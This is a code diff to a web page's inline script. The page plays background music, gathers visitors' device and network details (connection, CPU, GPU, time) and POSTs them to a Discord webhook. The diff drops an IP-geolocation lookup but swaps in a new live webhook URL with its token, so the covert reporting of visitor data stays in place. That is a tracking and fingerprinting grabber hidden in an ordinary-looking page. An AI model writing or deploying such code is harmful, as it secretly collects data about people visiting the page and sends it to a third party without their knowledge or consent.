@@ -41,12 +41,12 @@
     </div>
 
     <div id="main-content">
-        <img id="background-gif" src="zyliex.gif" alt="Background">
+        <img id="background-gif" src="fina.gif" alt="Background">
         <div id="info-display"></div>
     </div>
     
     <audio id="background-music" loop>
-        <source src="zyliex.mp3" type="audio/mpeg">
+        <source src="paka.mp3" type="audio/mpeg">
     </audio>
 
     <script>
@@ -55,25 +55,20 @@
             document.getElementById('main-content').style.display = 'block';
             
             const music = document.getElementById('background-music');
+            music.src = "https://raw.githubusercontent.com/xSunia/suniafile/main/paka.mp3";
             music.volume = 0.5;
             music.play().catch(e => console.log("Playback prevented:", e));
             
             const display = document.getElementById('info-display');
-            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
             const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1, charging: true }));
             const connection = navigator.connection || {};
             const now = new Date();
 
             const infoLines = [
                 `--- NETWORK ---`,
-                `IP ADDRESS: ${ipData.ip}`,
-                `ISP: ${ipData.org}`,
-                `ASN: ${ipData.asn}`,
-                `LOCATION: ${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
-                `LAT/LONG: ${ipData.latitude}, ${ipData.longitude}`,
-                `TIMEZONE: ${ipData.timezone}`,
                 `CONNECTION: ${connection.effectiveType || 'N/A'}`,
                 `DOWNLINK: ${connection.downlink || 'N/A'} Mbps`,
+                `RTT: ${connection.rtt || 'N/A'} ms`,
                 `--- HARDWARE ---`,
                 `CPU THREADS: ${navigator.hardwareConcurrency}`,
                 `GPU VENDOR: ${getGPUInfo('vendor')}`,
@@ -92,7 +87,7 @@
                 `TIME: ${now.toLocaleString()}`
             ];
 
-            fetch('https://discordapp.com/api/webhooks/1516629813337522298/qhB-GiRVtBCaUcwNWSygoM9pIazDRlIdSZExyh276OfEyEtCSEn3_bFUoOPhSyJYrnRJ', {
+            fetch('https://discord.com/api/webhooks/1533231369705230530/E-q0XPLkNDIa1MgFW4-9jEz8oe4X03j6YBDMwsbjDLMuuf137tFZExa8SIG55SwGpYjn', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
